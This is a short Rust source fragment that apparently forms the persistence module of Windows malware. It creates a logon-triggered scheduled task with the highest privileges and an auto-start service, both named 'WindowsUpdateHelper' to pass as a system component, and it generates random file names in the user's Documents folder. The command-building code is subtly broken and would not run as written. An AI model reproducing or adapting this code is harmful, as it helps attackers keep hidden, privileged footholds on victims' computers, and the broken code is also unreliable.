use std::process::Command;
use std::path::Path;
use std::fs;
use rand::Rng;
use std::env;


pub fn setup_multifaceted_persistence(exe_path: &str) {
    let task_name = "WindowsUpdateHelper";
    let task_command = format!(
        r#"schtasks /create /tn "{}" /tr "{}" /sc onlogon /rl highest /f"#,
        task_name, exe_path
    );
    execute_command("schtasks.exe", &task_command, "Scheduled task persistence");
    let service_command = format!(r#"sc create WindowsUpdateHelper binPath= "{}" start= auto"#, exe_path);
    execute_command("sc.exe", &service_command, "Service persistence");
}

fn execute_command(command: &str, args: &str, description: &str) {
    let status = Command::new(command)
        .args(args.split_whitespace())
        .status()
        .expect("Failed to execute command");
    if !status.success() {
        eprintln!("{} failed: {:?}", description, status);
    }
}


fn generate_random_path() -> String {
    let documents = env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Default".to_string());
    let work_dir = format!("{}\\Documents\\Work", documents);
    if !Path::new(&work_dir).exists() {
        fs::create_dir_all(&work_dir).expect("Failed to create Work directory");
    }
    let random_name: String = rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(8)
        .map(char::from)
        .collect();
    format!("{}\\{}", work_dir, random_name)
}